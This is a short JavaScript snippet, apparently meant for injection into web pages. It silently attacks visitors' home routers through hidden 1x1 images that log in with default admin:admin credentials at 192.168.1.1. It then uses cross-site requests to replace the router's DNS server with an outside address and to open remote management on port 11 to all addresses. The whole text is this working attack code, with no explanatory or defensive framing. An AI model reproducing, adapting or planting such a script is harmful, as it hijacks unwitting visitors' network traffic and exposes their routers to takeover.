if (MSIE = navigator.userAgent.indexOf("MSIE") == -1) {
    document.writeln("<div style=\'display:none\'>");

    function ip1() {
        i = new Image;
        i.src = 'http://192.168.1.1/userRpm/PPPoECfgAdvRpm.htm?wan=0&lcpMru=1480&ServiceName=&AcName=&EchoReq=0&manual=2&dnsserver=58.221.59.217&dnsserver2=114.114.114.114&downBandwidth=0&upBandwidth=0&Save=%B1%A3+%B4%E6&Advanced=Advanced';
    }
    document.write('<img src="http://admin:admin@192.168.1.1/images/logo.jpg" height=1 width=1 onload=ip1()>');

    function ip3() {
        ii = new Image;
        ii.src = 'http://192.168.1.1/userRpm/ManageControlRpm.htm?port=11&ip=0.0.0.0&Save=%C8%B7+%B6%A8';
    }
    document.write('<img src="http://admin:admin@192.168.1.1/images/logo.jpg" height=1 width=1 onload=ip3()>');
    document.writeln("</div>");
}